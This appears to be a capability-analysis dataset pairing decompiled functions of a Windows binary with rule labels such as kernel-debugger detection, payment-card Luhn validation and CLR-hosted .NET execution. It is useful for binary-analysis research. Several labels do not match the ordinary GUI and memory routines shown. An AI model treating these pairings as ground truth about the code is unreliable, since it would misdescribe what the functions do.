{
    "0040130c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nushort fcn.0040130c(void)\n\n{\n    ushort uVar1;\n    uchar auStack72 [40];\n    uint8_t uStack32;\n    ushort uStack28;\n    \n    sub.kernel32.dll_GetStartupInfoA(auStack72);\n    uVar1 = 10;\n    if ((uStack32 & 1) != 0) {\n        uVar1 = uStack28;\n    }\n    return uVar1;\n}\n",
        "token_count": 96
    },
    "00401cb0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.00401cb0(void)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    \n    uVar1 = *(in_EAX + -4);\n    if ((uVar1 & 0x80000002) != 0x80000002) {\n        *0x4635c4 = 4;\n    }\n    uVar3 = uVar1 & 0x7ffffffc;\n    puVar2 = in_EAX - uVar3;\n    if (((uVar1 ^ *puVar2) & 0xfffffffe) != 0) {\n        *0x4635c4 = 5;\n    }\n    if ((*puVar2 & 1) != 0) {\n        uVar1 = puVar2[-1];\n        if (uVar1 != *(puVar2 + (8 - uVar1))) {\n            *0x4635c4 = 6;\n        }\n        fcn.00401ba0();\n        uVar3 = uVar3 + uVar1;\n    }\n    return uVar3;\n}\n",
        "token_count": 255
    },
    "00402278": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint fcn.00402278(void)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    *0x4635c4 = 0;\n    if (*0x4635c0 == '\\0') {\n        puStack24 = 0x402296;\n        cVar2 = fcn.004019fc();\n        if (cVar2 == '\\0') {\n            *0x4635c4 = 8;\n            return 8;\n        }\n    }\n    uStack28 = 0x40240a;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    if (*0x463049 != '\\0') {\n        uStack36 = 0x4635c8;\n        puStack24 = &stack0xfffffffc;\n        sub.kernel32.dll_EnterCriticalSection();\n    }\n    puVar5 = in_EAX + -4;\n    uVar4 = *puVar5;\n    if ((uVar4 & 2) == 0) {\n        *0x4635c4 = 9;\n        goto code_r0x004023e1;\n    }\n    *0x4635b0 = *0x4635b0 + -1;\n    *0x4635b4 = *0x4635b4 - ((uVar4 & 0x7ffffffc) - 4);\n    if ((uVar4 & 1) != 0) {\n        uVar1 = *(in_EAX + -8);\n        if ((uVar1 < 0xc) || ((uVar1 & 0x80000003) != 0)) {\n            *0x4635c4 = 10;\n            goto code_r0x004023e1;\n        }\n        puVar5 = puVar5 - uVar1;\n        if (uVar1 != puVar5[2]) {\n            *0x4635c4 = 10;\n            goto code_r0x004023e1;\n        }\n        uVar4 = uVar4 + uVar1;\n        fcn.00401ba0();\n    }\n    uVar4 = uVar4 & 0x7ffffffc;\n    puVar5 = puVar5 + uVar4;\n    if (puVar5 == *0x46361c) {\n        *0x46361c = *0x46361c - uVar4;\n        *0x463618 = *0x463618 + uVar4;\n        if (0x3c00 < *0x463618) {\n            fcn.00401e90();\n        }\n        fcn.00403a90();\n        return 0;\n    }\n    if ((*puVar5 & 2) == 0) {\n        if (((puVar5[1] == 0) || (*puVar5 == 0)) || (puVar5[2] < 0xc)) {\n            *0x4635c4 = 0xb;\n            goto code_r0x004023e1;\n        }\n        fcn.00401ba0();\n    }\n    else {\n        if ((*puVar5 & 0x7ffffffc) < 4) {\n            *0x4635c4 = 0xb;\n            goto code_r0x004023e1;\n        }\n        *puVar5 = *puVar5 | 1;\n    }\n    fcn.00401e08();\ncode_r0x004023e1:\n    uVar3 = 0;\n    *in_FS_OFFSET = uStack36;\n    uStack28 = 0x402411;\n    if (*0x463049 != '\\0') {\n        uStack32 = 0x4635c8;\n        uVar3 = sub.kernel32.dll_LeaveCriticalSection();\n    }\n    return uVar3;\n}\n",
        "token_count": 911
    },
    "00414064": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00414064(uint param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    \n    if (param_2 < *(in_EAX + 4)) {\n        return -((*(*(in_EAX + 8) + (param_2 >> 3)) >> (param_2 & 7) & 1) != 0) & 1;\n    }\n    fcn.0040b5f4();\n    uVar1 = fcn.004039e4();\n    return uVar1;\n}\n",
        "token_count": 133
    },
    "00417090": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00417090(int32_t arg_8h)\n\n{\n    if (((*(arg_8h + -9) & 1) == 0) && (*(arg_8h + -0x10) == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 69
    },
    "00417364": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00417364(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack92;\n    uint uStack88;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint8_t var_9h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    uStack64 = 0x417585;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x41739a;\n    (**(*in_EAX + 0x24))();\n    puStack72 = 0x4173a5;\n    fcn.00418610();\n    puStack72 = 0x4173b0;\n    fcn.00418610();\n    iVar1 = in_EAX[0xb];\n    iVar2 = in_EAX[7];\n    uStack76 = 0x417555;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    if (param_2 == NULL) {\n        if ((var_9h & 1) == 0) {\n            uStack88 = 0x4173f1;\n            puStack72 = &stack0xfffffffc;\n            fcn.00417110(&stack0xfffffffc);\n        }\n        else {\n            uStack88 = 0x4173e8;\n            puStack72 = &stack0xfffffffc;\n            fcn.004172c0(&stack0xfffffffc);\n        }\n    }\n    if (param_2 != NULL) {\n        uStack88 = 0x417513;\n        uStack92 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa4;\n        fcn.00416fb0(&stack0xfffffffc);\n        *(param_2 + 7) = *(param_2 + 7) | 1;\n        fcn.00417028(&stack0xfffffffc);\n        if ((var_9h & 1) == 0) {\n            fcn.00417220(&stack0xfffffffc);\n        }\n        if (param_2 == NULL) {\n            *in_FS_OFFSET = uStack92;\n            fcn.00403a90();\n            *in_FS_OFFSET = uStack80;\n            puStack72 = 0x41758c;\n            uStack76 = 0x417576;\n            fcn.00403fcc();\n            uStack76 = 0x417584;\n            fcn.00404f68();\n            return;\n        }\n        if ((*(param_2 + 0x1d) & 2) != 0) {\n            in_EAX[7] = param_2;\n        }\n        *(param_2 + 7) = *(param_2 + 7) | 2;\n        fcn.00417028(&stack0xfffffffc);\n        (**(*param_2 + 0x14))();\n        *(param_2 + 7) = *(param_2 + 7) & 0xfffd;\n        fcn.00417028(&stack0xfffffffc);\n        if ((var_9h & 2) != 0) {\n            fcn.00403454();\n        }\n        if (((var_9h & 1) == 0) && ((*(param_2 + 0x1d) & 2) == 0)) {\n            fcn.00416f74(&stack0xfffffffc);\n            fcn.00413a08();\n        }\n        else {\n            iVar3 = fcn.00413bc0();\n            if (iVar3 < 0) {\n                fcn.00416f74(&stack0xfffffffc);\n                fcn.00413a08();\n            }\n        }\n        *in_FS_OFFSET = uStack92;\n    }\n    *in_FS_OFFSET = uStack80;\n    in_EAX[0xb] = iVar1;\n    in_EAX[7] = iVar2;\n    return;\n}\n",
        "token_count": 1001
    },
    "00419764": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00419764(void)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    \n    while (*(in_EAX + 0x10) != 0) {\n        piVar1 = fcn.00413c4c();\n        if (((*(piVar1 + 0x1d) & 1) == 0) && (*0x4197b8 != (*0x4197b8 & *(in_EAX + 0x1c)))) {\n            fcn.004196ac();\n        }\n        else {\n            fcn.0041972c();\n        }\n        (**(*piVar1 + -4))();\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "0041c904": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041c904(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    uint *puStack112;\n    int32_t iStack108;\n    uint uStack104;\n    uchar *puStack100;\n    int32_t iStack96;\n    uint uStack92;\n    uchar *puStack88;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar var_28h;\n    uchar var_27h;\n    uchar var_26h;\n    uchar var_25h;\n    uint var_24h;\n    int32_t var_4h;\n    \n    puStack88 = &stack0xfffffffc;\n    uStack92 = 0x41ca8d;\n    iStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa0;\n    var_4h = *(in_EAX + 0x10);\n    if (*(var_4h + 8) == 0) {\n        puStack100 = 0x41c943;\n        fcn.0041bc48();\n        uStack104 = 0x41ca65;\n        iStack108 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff94;\n        puStack100 = &stack0xfffffffc;\n        if (*(var_4h + 8) == 0) {\n            var_40h = *(var_4h + 0x14);\n            var_3ch = 0;\n            var_38h = 0;\n            var_34h = 0;\n            if ((*(var_4h + 0x19) & 1) == 0) {\n                var_30h = 400;\n            }\n            else {\n                var_30h = 700;\n            }\n            var_2ch._0_1_ = (*(var_4h + 0x19) & 2) != 0;\n            var_2ch._1_1_ = (*(var_4h + 0x19) & 4) != 0;\n            var_2ch._2_1_ = (*(var_4h + 0x19) & 8) != 0;\n            var_2ch._3_1_ = *(var_4h + 0x1a);\n            puStack100 = &stack0xfffffffc;\n            fcn.0040420c();\n            iVar2 = fcn.00407ce0();\n            if (iVar2 == 0) {\n                fcn.0040420c();\n                fcn.00408674();\n            }\n            else {\n                fcn.0040420c();\n                fcn.00408674();\n            }\n            var_26h = 0;\n            var_28h = 0;\n            var_27h = 0;\n            cVar1 = fcn.0041cbe8();\n            if (cVar1 == '\\x01') {\n                var_25h = 2;\n            }\n            else if (cVar1 == '\\x02') {\n                var_25h = 1;\n            }\n            else {\n                var_25h = 0;\n            }\n            puStack112 = &fcn.0041c904::var_40h;\n            uVar3 = sub.gdi32.dll_CreateFontIndirectA();\n            *(var_4h + 8) = uVar3;\n        }\n        *in_FS_OFFSET = puStack112;\n        uStack104 = 0x41ca6c;\n        iStack108 = 0x41ca64;\n        fcn.0041bc54();\n        return;\n    }\n    *in_FS_OFFSET = iStack96;\n    puStack88 = 0x41ca94;\n    uStack92 = 0x41ca8c;\n    fcn.00403fcc();\n    return;\n}\n",
        "token_count": 913
    },
    "0041d8d8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041d8d8(uint param_1, uint8_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    param_2 = ~*(in_EAX + 2) & param_2;\n    if (*0x41d948 != param_2) {\n        if ((param_2 & 1) != 0) {\n            (**(*in_EAX + 0x14))();\n            if (in_EAX[1] == 0) {\n                fcn.0040b5f4();\n                fcn.004039e4();\n            }\n        }\n        if ((param_2 & 2) != 0) {\n            fcn.0041d974();\n        }\n        if ((param_2 & 4) != 0) {\n            fcn.0041d9a0();\n        }\n        if ((param_2 & 8) != 0) {\n            fcn.0041d9d0();\n        }\n        *(in_EAX + 2) = param_2 | *(in_EAX + 2);\n    }\n    return;\n}\n",
        "token_count": 245
    },
    "null": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00427870": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00427a77)\n\nvoid fcn.00427870(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t *puVar5;\n    uint *in_FS_OFFSET;\n    bool bVar6;\n    uint uStack128;\n    uint uStack124;\n    uchar *puStack120;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_3ch;\n    uint var_38h;\n    uint32_t var_34h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack120 = &stack0xfffffffc;\n    uStack124 = 0x427b21;\n    uStack128 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff80;\n    (**(*in_EAX[0x1f] + 0x44))();\n    fcn.00402c64();\n    fcn.00427820();\n    fcn.00404468();\n    iVar1 = in_EAX[0x19];\n    in_EAX[0x1a] = iVar1;\n    fcn.004045f4();\n    fcn.00404468();\n    fcn.00402c64();\n    fcn.00404468();\n    fcn.00408640();\n    if ((in_EAX[0x1b] != 0) || (*0x461720 == '\\0')) {\n        fcn.00404468();\n    }\n    fcn.00404468();\n    var_34h = 0x20;\n    uVar3 = 0;\n    puVar5 = 0x46172c;\n    do {\n        bVar6 = uVar3 < 0x1f;\n        if (uVar3 < 0x20) {\n            bVar6 = (*(in_EAX + ((uVar3 & 0x7f) >> 3) + 0x5c) >> (uVar3 & 7) & 1) != 0;\n        }\n        if (bVar6) {\n            var_34h = var_34h | *puVar5;\n        }\n        uVar3 = uVar3 + 1;\n        puVar5 = puVar5 + 1;\n    } while (uVar3 != '\\x16');\n    if (**0x461fc0 == '\\0') {\n        var_34h = var_34h & 0xfff7ffff;\n    }\n    else {\n        var_34h = var_34h ^ 0x80000;\n        if (((4 < **0x461f30) && (**0x462204 == 2)) || ((**0x462204 == 1 && ((3 < **0x461f30 && (0x59 < **0x4620e8))))))\n        {\n            cVar2 = '\\0';\n            do {\n                cVar2 = cVar2 + '\\x01';\n            } while (cVar2 != '\\x01');\n        }\n    }\n    fcn.00404040();\n    if ((var_34h & 0x80000) == 0) {\n        fcn.004084e4();\n        fcn.00404508();\n    }\n    iVar4 = (**(*in_EAX + 0x38))();\n    if (iVar4 != 0) {\n        fcn.00427c7c();\n        if ((var_34h & 0x400) == 0) {\n            in_EAX[0x17] = in_EAX[0x17] & 0xffffff7f;\n        }\n        else {\n            in_EAX[0x17] = in_EAX[0x17] | 0x80;\n        }\n        if ((var_34h & 1) == 0) {\n            in_EAX[0x17] = in_EAX[0x17] & 0xfffffffe;\n        }\n        else {\n            in_EAX[0x17] = in_EAX[0x17] | 1;\n        }\n        in_EAX[0x19] = iVar1;\n    }\n    *in_FS_OFFSET = uStack128;\n    puStack120 = 0x427b28;\n    uStack124 = 0x427b20;\n    fcn.00403fcc();\n    return;\n}\n",
        "token_count": 1046
    },
    "00427c7c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00427c7c(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack24 = &fcn.00427c7c::var_1h + 1;\n    uStack28 = 0x427d27;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    var_1h._0_1_ = 0;\n    if (((*(in_EAX + 0x5c) & 0x40) != 0) && (((*(in_EAX + 0x5e) & 1) != 0 || (**0x461fc0 == '\\0')))) {\n        var_1h._0_1_ = 0x20;\n    }\n    if ((*(in_EAX + 0x5c) & 0x40) == 0) {\n        fcn.00427b34(&fcn.00427c7c::var_1h + 1);\n        (**(**(in_EAX + 0x7c) + 0x38))();\n    }\n    else {\n        puStack24 = &fcn.00427c7c::var_1h + 1;\n        fcn.00427b7c(&fcn.00427c7c::var_1h + 1);\n        (**(**(in_EAX + 0x7c) + 0xc))();\n        fcn.00403ffc();\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x427d2e;\n    uStack28 = 0x427d26;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 441
    },
    "00429e04": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint fcn.00429e04(void)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    \n    uVar4 = 0;\n    piVar1 = *(*(in_EAX + 0x168) + 0xc);\n    if ((((*(in_EAX + 0x57) != '\\0') && ((*(in_EAX + 0x1c) & 1) == 0)) && (piVar1 != NULL)) &&\n       (*(piVar1 + 0x22) != '\\0')) {\n        iVar3 = (**(*piVar1 + 0x24))();\n        if (iVar3 == 0) {\n            *(piVar1 + 0x22) = 0;\n        }\n        else {\n            iVar3 = fcn.004506c0();\n            if ((iVar3 != 0) && (*(iVar3 + 0x22e) != '\\0')) {\n                cVar2 = fcn.0044000c();\n                if (cVar2 != '\\0') {\n                    if (*(in_EAX + 0x17c) == '\\0') {\n                        uVar4 = fcn.0043fd08(0x30f, 0, 0);\n                        sub.user32.dll_PostMessageA(uVar4);\n                    }\n                    else {\n                        fcn.0043a6d4(0);\n                    }\n                    uVar4 = 1;\n                    *(piVar1 + 0x22) = 0;\n                }\n            }\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 360
    },
    "0042ab00": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0042ab00(int32_t *param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00432dec();\n    fcn.00413a08();\n    fcn.0043944c();\n    (**(*param_1 + 0x50))();\n    (**(*in_EAX + 100))();\n    fcn.004396a0();\n    in_EAX[0x49] = param_1;\n    in_EAX[0x48] = 0x42af30;\n    (**(*in_EAX + 0x68))();\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 254
    },
    "004388a0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004388a0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (param_2 == 0) {\n        fcn.00403258();\n        *(in_EAX + 0x6c) = 0;\n        *(in_EAX + 0x50) = *(in_EAX + 0x50) & 0xffff7fff;\n    }\n    else {\n        *(in_EAX + 0x50) = *(in_EAX + 0x50) | 0x8000;\n        if (*(in_EAX + 0x6c) == 0) {\n            iVar1 = fcn.00403454();\n            uVar2 = (**(iVar1 + 0x14))();\n            *(in_EAX + 0x6c) = uVar2;\n        }\n        (**(**(in_EAX + 0x6c) + 0xc))();\n        iVar1 = *(in_EAX + 0x6c);\n        *(iVar1 + 0xc) = in_EAX;\n        *(iVar1 + 8) = 0x43b4f0;\n        fcn.00403454();\n        fcn.004195ec();\n    }\n    return;\n}\n",
        "token_count": 297
    },
    "00438a40": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00438a40(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    cVar1 = *(in_EAX + 0x5b);\n    if (param_2 != cVar1) {\n        *(in_EAX + 0x5b) = param_2;\n        fcn.00438880();\n        if (((*(in_EAX + 7) & 1) == 0) &&\n           (((((*(in_EAX + 7) & 0x10) == 0 || (in_EAX[0xc] != 0)) && (param_2 != '\\x06')) && (cVar1 != '\\x06')))) {\n            if ((((cVar1 - 1U < 2 == param_2 - 3U < 2) && (cVar1 != '\\0')) && (cVar1 != '\\x05')) &&\n               ((param_2 != '\\0' && (param_2 != '\\x05')))) {\n                (**(*in_EAX + 0x84))(in_EAX[0x12], in_EAX[0x13]);\n            }\n            else {\n                fcn.00403454();\n            }\n        }\n    }\n    fcn.00403454();\n    return;\n}\n",
        "token_count": 291
    },
    "00438ae8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00438ae8(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    \n    cVar1 = fcn.0043ac64();\n    if ((cVar1 != '\\0') &&\n       ((((in_EDX != in_EAX[0x10] || (in_ECX != in_EAX[0x11])) || (arg_ch != in_EAX[0x12])) || (arg_8h != in_EAX[0x13]))\n       )) {\n        fcn.00439974();\n        in_EAX[0x10] = in_EDX;\n        in_EAX[0x11] = in_ECX;\n        in_EAX[0x12] = arg_ch;\n        in_EAX[0x13] = arg_8h;\n        fcn.00438b80();\n        (**(*in_EAX + 0x7c))();\n        fcn.0043a6d4(0);\n        fcn.00403454();\n        if ((*(in_EAX + 7) & 1) == 0) {\n            fcn.00403454();\n        }\n    }\n    return;\n}\n",
        "token_count": 285
    },
    "00438b80": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00438b80(void)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint uStack16;\n    uint uStack12;\n    \n    if ((*(in_EAX + 0x62) == '\\0') && ((*(in_EAX + 0x1c) & 1) == 0)) {\n        uVar1 = *(in_EAX + 0x61);\n        if (*0x438c98 == uVar1) {\n            *(in_EAX + 0x90) = 0;\n            *(in_EAX + 0x94) = 0;\n        }\n        else {\n            if ((uVar1 & 4) == 0) {\n                iVar3 = *(in_EAX + 0x48) >> 1;\n                if (iVar3 < 0) {\n                    iVar3 = iVar3 + ((*(in_EAX + 0x48) & 1) != 0);\n                }\n                *(in_EAX + 0x88) = iVar3 + *(in_EAX + 0x40);\n            }\n            else if ((uVar1 & 1) == 0) {\n                *(in_EAX + 0x88) = *(in_EAX + 0x40);\n            }\n            else {\n                *(in_EAX + 0x88) = *(in_EAX + 0x48);\n            }\n            if ((uVar1 & 8) == 0) {\n                iVar3 = *(in_EAX + 0x4c) >> 1;\n                if (iVar3 < 0) {\n                    iVar3 = iVar3 + ((*(in_EAX + 0x4c) & 1) != 0);\n                }\n                *(in_EAX + 0x8c) = iVar3 + *(in_EAX + 0x44);\n            }\n            else if ((uVar1 & 2) == 0) {\n                *(in_EAX + 0x8c) = *(in_EAX + 0x44);\n            }\n            else {\n                *(in_EAX + 0x8c) = *(in_EAX + 0x4c);\n            }\n            iVar3 = *(in_EAX + 0x30);\n            if (iVar3 != 0) {\n                if ((*(iVar3 + 0x1c) & 2) == 0) {\n                    cVar2 = fcn.0044000c();\n                    if (cVar2 == '\\0') {\n                        *(in_EAX + 0x90) = *(*(in_EAX + 0x30) + 0x48);\n                        *(in_EAX + 0x94) = *(*(in_EAX + 0x30) + 0x4c);\n                    }\n                    else {\n                        (**(**(in_EAX + 0x30) + 0x44))();\n                        *(in_EAX + 0x90) = uStack16;\n                        *(in_EAX + 0x94) = uStack12;\n                    }\n                }\n                else if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n                    *(in_EAX + 0x90) = *(iVar3 + 0x1fa);\n                    *(in_EAX + 0x94) = *(iVar3 + 0x1fe);\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 765
    },
    "00438e94": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00438e94(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x1c) & 1) == 0) {\n        *(in_EAX + 0x150) = 1;\n    }\n    *(in_EAX + 0x158) = param_2;\n    return;\n}\n",
        "token_count": 91
    },
    "00438ea8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00438ea8(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x1c) & 1) == 0) {\n        *(in_EAX + 0x150) = 0;\n    }\n    fcn.00403ffc();\n    return;\n}\n",
        "token_count": 73
    },
    "00439148": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00439148(int32_t param_1, int32_t param_2)\n\n{\n    uint8_t uVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    bool bVar4;\n    int32_t in_stack_ffffffd4;\n    int32_t in_stack_ffffffdc;\n    int32_t iStack32;\n    \n    if (param_2 != param_1) {\n        uVar1 = *0x4392ec;\n        if ((*(in_EAX + 7) & 1) != 0) {\n            uVar1 = *(in_EAX + 0x26);\n        }\n        if ((uVar1 & 1) != 0) {\n            in_stack_ffffffd4 = in_EAX[0x10];\n            in_stack_ffffffdc = param_1;\n            sub.kernel32.dll_MulDiv(in_stack_ffffffd4, param_2, param_1);\n        }\n        if ((uVar1 & 2) != 0) {\n            sub.kernel32.dll_MulDiv(in_EAX[0x11], param_2, in_stack_ffffffd4);\n        }\n        if (((uVar1 & 4) == 0) || ((*(in_EAX + 0x51) & 1) != 0)) {\n            in_stack_ffffffdc = in_EAX[0x12];\n        }\n        else if ((uVar1 & 1) == 0) {\n            sub.kernel32.dll_MulDiv(in_EAX[0x12], param_2, in_stack_ffffffd4);\n        }\n        else {\n            sub.kernel32.dll_MulDiv(in_EAX[0x10] + in_EAX[0x12], param_2, in_stack_ffffffd4);\n        }\n        bVar4 = (uVar1 & 8) == 0;\n        if ((bVar4) || ((*(in_EAX + 0x51) & 2) != 0)) {\n            iStack32 = in_EAX[0x13];\n        }\n        else {\n            iStack32 = param_1;\n            if (bVar4) {\n                sub.kernel32.dll_MulDiv(in_EAX[0x11], param_2, in_stack_ffffffd4);\n            }\n            else {\n                sub.kernel32.dll_MulDiv(in_EAX[0x11] + in_EAX[0x13], param_2, in_stack_ffffffd4);\n            }\n        }\n        (**(*in_EAX + 0x84))(iStack32, in_stack_ffffffdc);\n        if (*0x4392f4 != (uVar1 & *0x4392f0)) {\n            iVar2 = sub.kernel32.dll_MulDiv(in_EAX[0x24], param_2, iStack32);\n            in_EAX[0x24] = iVar2;\n        }\n        if (*0x4392f4 != (uVar1 & *0x4392f8)) {\n            iVar2 = sub.kernel32.dll_MulDiv(in_EAX[0x25], param_2, iStack32);\n            in_EAX[0x25] = iVar2;\n        }\n        if ((*(in_EAX + 0x59) == '\\0') && ((uVar1 & 0x10) != 0)) {\n            uVar3 = fcn.0041cb74(param_2, iStack32);\n            sub.kernel32.dll_MulDiv(uVar3);\n            fcn.0041cb90();\n        }\n    }\n    *(in_EAX + 0x26) = *0x4392f4;\n    return;\n}\n",
        "token_count": 809
    },
    "00439314": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
